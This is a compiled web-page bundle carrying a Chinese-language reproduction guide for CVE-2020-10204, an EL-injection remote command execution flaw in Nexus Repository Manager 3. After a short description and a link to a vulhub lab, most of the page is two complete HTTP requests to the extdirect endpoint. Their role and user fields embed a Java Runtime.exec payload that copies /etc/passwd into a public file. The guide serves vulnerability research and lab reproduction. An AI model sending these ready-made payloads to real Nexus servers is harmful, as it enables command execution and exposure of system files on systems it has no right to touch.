(window.webpackJsonp=window.webpackJsonp||[]).push([[456],{2190:function(s,t,a){s.exports=a.p+"assets/img/image-20210628181754513.f3e4c135.png"},2191:function(s,t,a){s.exports=a.p+"assets/img/image-20210628191832105.ada1e77c.png"},3156:function(s,t,a){"use strict";a.r(t);var e=a(64),r=Object(e.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"nexus-repository-manger-extdirect-后台远程命令执行-cve-2020-10204"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#nexus-repository-manger-extdirect-后台远程命令执行-cve-2020-10204"}},[s._v("#")]),s._v(" Nexus Repository Manger extdirect 后台远程命令执行 CVE-2020-10204")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET等软件源仓库。其3.21.1及之前版本中，存在一处任意EL表达式注入漏洞，这个漏洞是CVE-2018-16621的绕过。")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("Nexus < 3.21.1")]),t("br"),s._v(" "),t("h2",{attrs:{id:"环境搭建"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10204")]),t("br"),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("漏洞触发需要任意账户权限")]),s._v(" "),t("p",[t("img",{attrs:{src:a(2190),alt:"img"}})]),s._v(" "),t("p",[s._v("该漏洞需要访问更新角色或创建角色接口，登录任意用户后修改 "),t("code",[s._v("NXSESSIONID")])]),s._v(" "),t("p",[s._v("发送请求包执行命令")]),s._v(" "),t("div",{staticClass:"language-json line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-json"}},[t("code",[s._v("POST /service/extdirect HTTP/"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" \naccept"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" application/json\nUser-Agent"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" Mozilla/"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.0")]),s._v(" (X11; Linux x86_64) AppleWebKit/"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v(" (KHTML"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" like Gecko) Chrome/"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("81.0")]),s._v("."),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4044.138")]),s._v(" Safari/"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v("\nNX-ANTI-CSRF-TOKEN"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.856555763510765")]),s._v("\nContent-Type"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" application/json\nCookie"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" jenkins-timestamper-offset="),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("-28800000")]),s._v("; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627="),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1583249520")]),s._v("; NX-ANTI-CSRF-TOKEN="),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.856555763510765")]),s._v("; NXSESSIONID=e9d6620d"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("-6843")]),s._v("-49a6-a887-cd7cef74d413\nContent-Length"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("304")]),s._v("\n\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"action"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"coreui_Role"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"method"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"create"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"data"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"version"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"source"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"default"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"id"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"1111"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"name"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"2222"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"description"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"3333"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"privileges"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"$\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}\"")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"roles"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"type"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"rpc"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"tid"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("89")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br")])]),t("p",[s._v("另一处漏洞点")]),s._v(" "),t("div",{staticClass:"language-json line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-json"}},[t("code",[s._v("POST /service/extdirect HTTP/"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" \naccept"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" application/json\nUser-Agent"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" Mozilla/"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.0")]),s._v(" (X11; Linux x86_64) AppleWebKit/"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v(" (KHTML"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" like Gecko) Chrome/"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("81.0")]),s._v("."),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4044.138")]),s._v(" Safari/"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v("\nNX-ANTI-CSRF-TOKEN"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.856555763510765")]),s._v("\nContent-Type"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" application/json\nCookie"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" jenkins-timestamper-offset="),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("-28800000")]),s._v("; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627="),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1583249520")]),s._v("; NX-ANTI-CSRF-TOKEN="),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.856555763510765")]),s._v("; NXSESSIONID=e9d6620d"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("-6843")]),s._v("-49a6-a887-cd7cef74d413\nContent-Length"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("304")]),s._v("\n\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"action"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"coreui_User"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"method"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"update"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"data"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"userId"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"www"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"version"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"2"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"firstName"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"www"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"lastName"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"www"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"email"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"www@qq.com"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"status"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"active"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"roles"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"$\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}\"")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"type"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"rpc"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"tid"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("9")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br")])]),t("p",[s._v("访问 vuln.html")]),s._v(" "),t("p",[t("img",{attrs:{src:a(2191),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=r.exports}}]);